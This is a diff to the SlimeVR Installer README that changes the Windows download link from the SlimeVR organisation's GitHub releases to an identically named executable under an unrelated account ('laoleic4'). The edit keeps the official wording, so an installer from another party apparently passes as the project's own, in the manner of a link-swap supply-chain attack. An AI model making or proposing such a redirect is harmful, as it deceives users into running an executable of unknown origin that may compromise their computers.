@@ -1,7 +1,7 @@
 # SlimeVR Installer
 
 Get yourself an installer from the releases page:
-* Windows: https://github.com/SlimeVR/SlimeVR-Installer/releases/latest/download/slimevr_web_installer.exe
+* Windows: https://github.com/laoleic4/SlimeVR-Installer/releases/latest/download/slimevr_web_installer.exe
 
 ## Contributions
 
